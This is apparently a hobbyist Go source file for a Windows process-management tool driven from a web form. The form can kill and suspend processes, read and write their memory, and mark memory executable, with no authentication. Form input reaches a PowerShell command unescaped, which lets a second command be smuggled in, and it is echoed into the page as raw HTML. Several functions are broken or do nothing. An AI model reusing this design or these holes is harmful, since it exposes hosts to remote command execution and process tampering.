package main

import (
    "fmt"
    "html/template"
    "net/http"
    "strconv"
    "strings"
	"os/exec"
	"bytes"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)


const (
	DELETE          = "0x00010000L" 	//Required to delete the object.
	READ_CONTROL    = "0x00020000L" 	//Required to read information in the security descriptor for the object, not including the information in the SACL. To read or write the SACL, you must request the ACCESS_SYSTEM_SECURITY access right. For more information, see SACL Access Right.
	SYNCHRONIZE     = "0x00100000L" 	//The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.
	WRITE_DAC       = "0x00040000L" 	//Required to modify the DACL in the security descriptor for the object.
	WRITE_OWNER     ="0x00080000L"      // Required to change the owner in the security descriptor for the object.

)

const (
    ACCESS                      = windows.PROCESS_SET_INFORMATION
    PROCESS_ALL_ACCESS          = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF
    PROCESS_CREATE_PROCESS      = 0x0080
    PROCESS_CREATE_THREAD       = 0x0002
    PROCESS_DUP_HANDLE          = 0x0040
    PROCESS_QUERY_INFORMATION    = 0x0400
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    PROCESS_SET_INFORMATION     = 0x0200
    PROCESS_SET_QUOTA           = 0x0100
    PROCESS_SUSPEND_RESUME      = 0x0800
    PROCESS_TERMINATE           = 0x0001
    PROCESS_VM_OPERATION        = 0x0008
    PROCESS_VM_READ             = 0x0010
    PROCESS_VM_WRITE            = 0x0020
)

const (
    // Define ANSI color codes
    green = "\033[32m"
    reset = "\033[0m"
)

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess        = kernel32.NewProc("OpenProcess")
	procEnumProcessThreads = kernel32.NewProc("EnumProcessThreads")
	procSuspendThread      = kernel32.NewProc("SuspendThread")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
	procVirtualProtectEx   = kernel32.NewProc("VirtualProtectEx")
)

var (
    iphlpapi               = syscall.NewLazyDLL("Iphlpapi.dll")
    procGetExtendedTcpTable = iphlpapi.NewProc("GetExtendedTcpTable")
)


const (
    IDLE_PRIORITY_CLASS           = 0x00000040
    BELOW_NORMAL_PRIORITY_CLASS   = 0x00004000
    NORMAL_PRIORITY_CLASS         = 0x00000020
    ABOVE_NORMAL_PRIORITY_CLASS   = 0x00008000
    HIGH_PRIORITY_CLASS           = 0x00000080
    REALTIME_PRIORITY_CLASS       = 0x00000100
)

const (
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE         = 0x04
)

var ( 
	entry syscall.ProcessEntry32
)
//************************************************************************************************************************************************************************************************


func FindPidByNamePowerShell(processName string) ([]int, error) {
    // Build the PowerShell command
    // `Get-Process -Name %s | Select-Object -ExpandProperty Id` finds processes with the given name and gets their IDs.
    powershellCommand := fmt.Sprintf(`Get-Process -Name %s | Where-Object { $_.Parent -eq $null } | Select-Object -ExpandProperty Id`, processName)

    // Execute the command using `powershell -Command <command>`
    // `exec.Command` creates a command to be executed. Here, it runs PowerShell with the specified command.
    cmd := exec.Command("powershell", "-Command", powershellCommand)

    // Capture the output using a buffer
    // `bytes.Buffer` is used to capture the output of the command.
    var out bytes.Buffer
    cmd.Stdout = &out // Set `cmd.Stdout` to point to `out` so output is stored in this buffer.

    // Run the command and check for errors
    // `cmd.Run()` executes the command. If an error occurs, it returns an error.
    err := cmd.Run()
    if err != nil {
        return nil, fmt.Errorf("error executing PowerShell command: %v", err) // Format error if command fails.
    }

    // Parse the output to get the PIDs
    // `out.String()` converts the captured output buffer to a string. `strings.TrimSpace()` removes leading/trailing whitespace.
    output := strings.TrimSpace(out.String())
    if output == "" {
        return nil, fmt.Errorf("no process found with the name: %s", processName) // Return error if no process is found.
    }

    // Split the output to get individual PIDs
    // `strings.Split()` splits the output string by newline to get individual PIDs.
    lines := strings.Split(output, "\n")
    var pids []int

    // Loop through each line, convert to int, and collect valid PIDs
    // `strings.TrimSpace()` removes any extra whitespace, and `strconv.Atoi()` converts strings to integers.
    for _, line := range lines {
        line = strings.TrimSpace(line)
        if pid, err := strconv.Atoi(line); err == nil { // Convert to integer if valid.
            pids = append(pids, pid) // Add the PID to the list of PIDs.
        }
    }

    // Check if we found any PIDs
    if len(pids) == 0 {
        return nil, fmt.Errorf("no process found with the name: %s", processName) // Return error if no PIDs were found.
    }

    return pids, nil // Return the list of PIDs.
}

// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Function to list all running processes
func ListInfoProcesses() (string, error) {
	var output string
	output += "\033[36mListing all processes...\033[0m\n"
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPALL, 0)
	if err != nil {
		return output, fmt.Errorf("error creating process snapshot: %w", err)
	}
	defer syscall.CloseHandle(snapshot)

	entry := syscall.ProcessEntry32{}
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = syscall.Process32First(snapshot, &entry)
	if err != nil {
		return output, fmt.Errorf("error retrieving first process: %w", err)
	}

	output += "\033[32mProcesses:\033[0m\n" 
	for {
		processName := syscall.UTF16ToString(entry.ExeFile[:])
		output += fmt.Sprintf("\033[32mPid: %d\tFile Name: %s\tThread: %d\tHeap Allocation: %d\tProcess Flags: %d\033[0m\n",
			entry.ProcessID, processName, entry.Threads, entry.DefaultHeapID, entry.Flags)

		err = syscall.Process32Next(snapshot, &entry)
		if err != nil {
			output += "\033[33mNo more processes...\033[0m\n"
			break
		}
	}

	return output, nil
}


// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Function to get detailed information about a specific process
func GetProcessInfo(name string) (string, error) {
	var output string

	pids, err := FindPidByNamePowerShell(name)
	if err != nil {
		return output, fmt.Errorf("error finding process: %w", err)
	}

	if len(pids) > 0 {
		for _, pid := range pids {
			pidValue := uint32(pid)
			output += fmt.Sprintf("\033[36mRetrieving information for PID: %d...\033[0m\n", pidValue)

			hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pidValue)
			if err != nil {
				output += fmt.Sprintf("\033[31mError opening process:\033[0m %v\n", err)
				continue
			}
			defer windows.CloseHandle(hProcess)

			var processName [windows.MAX_PATH]uint16
			processPathLength := uint32(len(processName))
			err = windows.QueryFullProcessImageName(hProcess, 0, &processName[0], &processPathLength)
			if err != nil {
				output += fmt.Sprintf("\033[31mError retrieving process name:\033[0m %v\n", err)
				continue
			}

			processNameStr := windows.UTF16ToString(processName[:])
			output += fmt.Sprintf("\033[32mPID: %d\tName: %s\033[0m\n", pidValue, processNameStr)

			var memInfo windows.MemoryBasicInformation
			addr := uintptr(0)

			for {
				ret := windows.VirtualQueryEx(hProcess, addr, &memInfo, uintptr(unsafe.Sizeof(memInfo)))
				if ret == nil {
					output += "\033[31mFinished querying memory regions.\033[0m\n"
					break
				}

				if memInfo.State == windows.MEM_COMMIT {
					output += fmt.Sprintf("\033[34mMemory Region: Base Address: %x, Region Size: %d bytes\033[0m\n", memInfo.BaseAddress, memInfo.RegionSize)
				}
				addr += memInfo.RegionSize
			}

			var creationTime, exitTime, kernelTime, userTime windows.Filetime
			err = windows.GetProcessTimes(hProcess, &creationTime, &exitTime, &kernelTime, &userTime)
			if err != nil {
				output += fmt.Sprintf("\033[31mError retrieving process times:\033[0m %v\n", err)
				continue
			}

			cpuTime := kernelTime.Nanoseconds() + userTime.Nanoseconds()
			output += fmt.Sprintf("\033[34mCPU Time: %d nanoseconds\033[0m\n", cpuTime)
		}
	} else {
		output += "\033[33mNo processes found with the given name.\033[0m\n"
	}

	return output, nil
}


        	
	
	// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

func generic() (string, error) {
	cmd := exec.Command("powershell", "-Command", "Get-Process | Where-Object { $_.Parent -eq $null }")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("error: %w", err)
	}

	return string(output), nil
}
	


//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


func VirtualProtection(name string, lpAddress uintptr, dwSize uintptr, flNewProtect uint32) (string, error) {
	var output string
	var oldProtectVar uint32

	pids, err := FindPidByNamePowerShell(name)
	if err != nil {
		return "", fmt.Errorf("error retrieving information for PID: %w", err)
	}

	for _, hpid := range pids {
		pid := uint32(hpid)
		handle, err := windows.OpenProcess(ACCESS, false, pid)
		if err != nil {
			output += fmt.Sprintf("\033[31mError opening process:\033[0m %v\n", err)
			continue
		}
		defer windows.CloseHandle(handle)

		ret, _, err := procVirtualProtectEx.Call(
			uintptr(handle),
			lpAddress,
			dwSize,
			uintptr(flNewProtect),
			uintptr(unsafe.Pointer(&oldProtectVar)),
		)
		if err != nil || ret == 0 {
			output += fmt.Sprintf("\033[36mError while calling VirtualProtection...\033[0m\n%v\n", err)
		}
	}

	return output, nil
}




// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Function to terminate a process by its PID
func TerminateProcess(proc string) (string, error) {
	var output string
	pids, err := FindPidByNamePowerShell(proc)
	if err != nil {
		return "", fmt.Errorf("error finding process: %w", err)
	}

	for _, pid := range pids {
		output += fmt.Sprintf("\033[31mTerminating process with PID: %d...\033[0m\n", pid)

		cmd := exec.Command("taskkill", "/PID", fmt.Sprint(pid), "/F")
		processOutput, err := cmd.CombinedOutput()
		if err != nil {
			output += fmt.Sprintf("\033[31mError terminating process:\033[0m %s\n", err)
			return output, err
		}

		output += fmt.Sprintf("\033[32mProcess terminated successfully:\033[0m %s\n", string(processOutput))
	}

	return output, nil
}

// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Function to set the priority of a process
func SetProcessPriority(proc string, priority uint32) error {
    pids, err := FindPidByNamePowerShell(proc)
    if err != nil {
        return fmt.Errorf("error finding process: %v", err)
    }
    
    for _, hpid := range pids {
        pid := uint32(hpid)		
        handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
        if err != nil {
            return fmt.Errorf("error opening process: %v", err)
        }
        defer windows.CloseHandle(handle)
    
        err = windows.SetPriorityClass(handle, priority)
        if err != nil {
            return fmt.Errorf("error setting priority class: %v", err)
        }
    }
    return nil
}


// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

//suspend te thread of the process
func SuspendProcess(proc string) {
    pids, err := FindPidByNamePowerShell(proc)
    if err != nil {
        return
    }
    
    for _, pid := range pids {
        hProcess, err := windows.OpenProcess(windows.PROCESS_SUSPEND_RESUME, false, uint32(pid))
        if err != nil {
            return
        }
        defer windows.CloseHandle(hProcess)
        // Suspend the process here (uncomment if needed)
        // _, err = windows.SuspendThread(hProcess)
    }
}


// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Close the handle
func closeHandle(handle syscall.Handle) {
	procCloseHandle.Call(uintptr(handle))
}

// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Function to resume a suspended process
func ResumeProcess(proc string) {
    pids, err := FindPidByNamePowerShell(proc)
    if err != nil {
        return
    }
    
    for _, pid := range pids {
        hProcess, err := windows.OpenProcess(windows.PROCESS_SUSPEND_RESUME, false, uint32(pid))
        if err != nil {
            return
        }
        defer windows.CloseHandle(hProcess)

        _, err = windows.ResumeThread(hProcess)
        if err != nil {
            return
        }
    }
}



// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Function to read memory from a specific process
func ReadMemory(proc string, address uintptr, size int) {
    pids, err := FindPidByNamePowerShell(proc)
    if err != nil {
        return
    }

    for _, pid := range pids {
        hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
        if err != nil {
            continue
        }
        defer windows.CloseHandle(hProcess)

        dataBytes := make([]byte, size)

        err = windows.ReadProcessMemory(hProcess, address, &dataBytes[0], uintptr(len(dataBytes)), nil)
        if err != nil {
            continue
        }
    }
}




// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Function to write data to a specific memory address of a process
func WriteMemory(proc string, address int, data string) {
    pids, err := FindPidByNamePowerShell(proc)
    if err != nil {
        return
    }

    for _, pid := range pids {
        hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
        if err != nil {
            continue
        }
        defer windows.CloseHandle(hProcess)

        dataBytes := []byte(data)

        err = windows.WriteProcessMemory(hProcess, uintptr(address), &dataBytes[0], uintptr(len(dataBytes)), nil)
        if err != nil {
            continue
        }
    }
}



//  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

//  DON'T LIKE THAT METHOD
func connection() (string, error) {
    out, err := exec.Command("netstat", "-an").Output()
    if err != nil {
        return "", err
    }

    output := string(out)
    lines := strings.Split(output, "\n")
    
    for _, line := range lines {
        if line != "" {
            return "", nil// Output can be handled as needed
        }
        return line, nil
    }
    return "", nil
}






// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

func DisplayHelp() {
	fmt.Println("\033[36mThis is a tool for process analysis, is suggested to use the 'generic' args as first one... \033[0m")
	fmt.Println("Use help for display this massage...")
	fmt.Println("\033[36mUsage: ProcHandle <command> [arguments]\033[0m")
	fmt.Println("\033[33mCommands:\033[0m")
	fmt.Println("\033[32m  list\033[0m                   \033[37mList all running processes on the system.\033[0m")
	fmt.Println("\033[32m  info <proc_name>\033[0m             \033[37mRetrieve detailed information for a specific process by its PID.\033[0m")
	fmt.Println("\033[32m  kill <proc_name>\033[0m        \033[37mTerminate a process by its PID.\033[0m")
	fmt.Println("\033[32m  set-priority <process_name> <priority>\033[0m \033[37mSet the priority for a process. Priority can be one of: low, normal, high, realtime.\033[0m")
	fmt.Println("\033[32m  suspend <proc_name>\033[0m          \033[37mSuspend a process by its PID.\033[0m")
	fmt.Println("\033[32m  cpnnection\033[0m          \033[37mRetrievs a list of all current connection.\033[0m")
	fmt.Println("\033[32m  resume <proc_name>\033[0m           \033[37mResume a suspended process by its PID.\033[0m")
	fmt.Println("\033[32m  read-memory <process_name> <address> <size>\033[0m \033[37mRead memory at a specific address of a process.\033[0m")
	fmt.Println("\033[32m  write-memory <process_name><address> <data>\033[0m \033[37mWrite data to a specific memory address of a process.\033[0m")
	fmt.Println("\033[32m  protect <process_name> <lpAddress> <dwSize> <flNewProtect>\033[0m \033[37mChange the type of permits of a specific memory region which belongs to the process given by name.\033[0m")
	
}






func main() {
	fmt.Println("Server running on http://localhost:8080")
    http.HandleFunc("/", handleForm)
    http.ListenAndServe(":8080", nil)
}

var lastOutput string // Global variable to store last command output

func handleForm(w http.ResponseWriter, r *http.Request) {
    if r.Method == http.MethodPost {
        command := r.FormValue("command")
        args := strings.Fields(r.FormValue("args"))

        switch command {
        
		case "connection":
			result, err := connection()
			if err != nil {
				fmt.Println("Error:", err)
				renderForm(w)
				return
			}
            lastOutput = "<p><strong>Output:</strong> Retrieved active connections: " +  result + "</p>"
            
        case "list":
            conn, err := ListInfoProcesses()
			if err != nil {
				fmt.Println("Error:", err)
				renderForm(w)
				return
			}
            lastOutput = "<p><strong>Output:</strong> Listed all processes: " + conn + "</p>"

        case "info":
            if len(args) < 1 {
                lastOutput = "<p style='color:red;'>Error: Missing process name</p>"
                renderForm(w)
                return
            }
            GetProcessInfo(args[0])
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Displayed info for process %s</p>", args[0])


        case "protect":
            if len(args) < 4 {
                lastOutput = "<p style='color:red;'>Error: Missing arguments for protect command</p>"
                renderForm(w)
                return
            }
            processName := args[0]
            lpAddress, err := strconv.ParseUint(args[1], 0, 64)
            if err != nil {
                lastOutput = fmt.Sprintf("<p style='color:red;'>Error parsing lpAddress: %v</p>", err)
                renderForm(w)
                return
            }
            dwSize, err := strconv.ParseUint(args[2], 0, 64)
            if err != nil {
                lastOutput = fmt.Sprintf("<p style='color:red;'>Error parsing dwSize: %v</p>", err)
                renderForm(w)
                return
            }
            var flNewProtect uint32
            switch args[3] {
            case "PAGE_EXECUTE_READWRITE":
                flNewProtect = PAGE_EXECUTE_READWRITE
            case "PAGE_READWRITE":
                flNewProtect = PAGE_READWRITE
            default:
                lastOutput = "<p style='color:red;'>Error: Invalid value for flNewProtect</p>"
                renderForm(w)
                return
            }
            VirtualProtection(processName, uintptr(lpAddress), uintptr(dwSize), flNewProtect)
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Memory protection updated for process %s</p>", processName)

        case "kill":
            if len(args) < 1 {
                lastOutput = "<p style='color:red;'>Error: Missing process name</p>"
                renderForm(w)
                return
            }
            TerminateProcess(args[0])
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Process %s terminated</p>", args[0])

        case "set-priority":
            if len(args) < 2 {
                lastOutput = "<p style='color:red;'>Error: Missing arguments for set-priority command</p>"
                renderForm(w)
                return
            }
            processName := args[0]
            priorityStr := args[1]

            priorityMap := map[string]uint32{
                "idle":          windows.IDLE_PRIORITY_CLASS,
                "below_normal":  windows.BELOW_NORMAL_PRIORITY_CLASS,
                "low":           windows.BELOW_NORMAL_PRIORITY_CLASS,
                "normal":        windows.NORMAL_PRIORITY_CLASS,
                "above_normal":  windows.ABOVE_NORMAL_PRIORITY_CLASS,
                "high":          windows.HIGH_PRIORITY_CLASS,
                "realtime":      windows.REALTIME_PRIORITY_CLASS,
            }

            priority, exists := priorityMap[priorityStr]
            if !exists {
                lastOutput = "<p style='color:red;'>Error: Invalid priority value</p>"
                renderForm(w)
                return
            }

            if err := SetProcessPriority(processName, priority); err != nil {
                lastOutput = fmt.Sprintf("<p style='color:red;'>Error setting process priority: %v</p>", err)
                renderForm(w)
                return
            }
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Process %s priority set to %s</p>", processName, priorityStr)

        case "suspend":
            if len(args) < 1 {
                lastOutput = "<p style='color:red;'>Error: Missing process name</p>"
                renderForm(w)
                return
            }
            SuspendProcess(args[0])
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Process %s suspended</p>", args[0])

        case "resume":
            if len(args) < 1 {
                lastOutput = "<p style='color:red;'>Error: Missing process name</p>"
                renderForm(w)
                return
            }
            ResumeProcess(args[0])
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Process %s resumed</p>", args[0])

        case "read-memory":
            if len(args) < 3 {
                lastOutput = "<p style='color:red;'>Error: Missing arguments for read-memory command</p>"
                renderForm(w)
                return
            }
            processName := args[0]
            address, err := strconv.ParseUint(args[1], 0, 64)
            if err != nil {
                lastOutput = fmt.Sprintf("<p style='color:red;'>Error parsing address: %v</p>", err)
                renderForm(w)
                return
            }
            size, err := strconv.Atoi(args[2])
            if err != nil {
                lastOutput = fmt.Sprintf("<p style='color:red;'>Error parsing size: %v</p>", err)
                renderForm(w)
                return
            }
            ReadMemory(processName, uintptr(address), size)
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Read memory from process %s</p>", processName)

        case "write-memory":
            if len(args) < 3 {
                lastOutput = "<p style='color:red;'>Error: Missing arguments for write-memory command</p>"
                renderForm(w)
                return
            }
            processName := args[0]
            address, err := strconv.ParseUint(args[1], 0, 64)
            if err != nil {
                lastOutput = fmt.Sprintf("<p style='color:red;'>Error parsing address: %v</p>", err)
                renderForm(w)
                return
            }
            data := args[2]
            WriteMemory(processName, int(address), data)
            lastOutput = fmt.Sprintf("<p><strong>Output:</strong> Wrote memory to process %s</p>", processName)

		default:
			lastOutput = fmt.Sprintf("<p style='color:red;'>Error: Unknown command %s</p>", command)
            DisplayHelp()
        }
    }

    renderForm(w)
}

func renderForm(w http.ResponseWriter) {
	tmpl := `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Process Management CLI Tool</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f0f0f0;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                background-color: #fff;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                width: 400px;
                text-align: center;
            }
            input[type="text"] {
                width: 100%;
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            button {
                padding: 10px 20px;
                background-color: #007BFF;
                color: #fff;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
            button:hover {
                background-color: #0056b3;
            }
            .output {
                margin-top: 20px;
                text-align: left;
                background-color: #f9f9f9;
                padding: 10px;
                border-radius: 4px;
                border: 1px solid #ccc;
                max-height: 200px;
                overflow-y: auto;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Process Management CLI Tool</h2>
            <form method="post">
                <input type="text" name="command" placeholder="Command" required>
                <input type="text" name="args" placeholder="Arguments (optional)">
                <button type="submit">Execute</button>
            </form>
            <div class="output">{{.Output}}</div>
        </div>
    </body>
    </html>
    `
	tmplParsed, err := template.New("form").Parse(tmpl)
	if err != nil {
		http.Error(w, "Error parsing template: "+err.Error(), http.StatusInternalServerError)
		return
	}
	err = tmplParsed.Execute(w, map[string]interface{}{
		"Output": template.HTML(lastOutput),
	})
	if err != nil {
		http.Error(w, "Error executing template: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Reset lastOutput after rendering
	lastOutput = ""
}
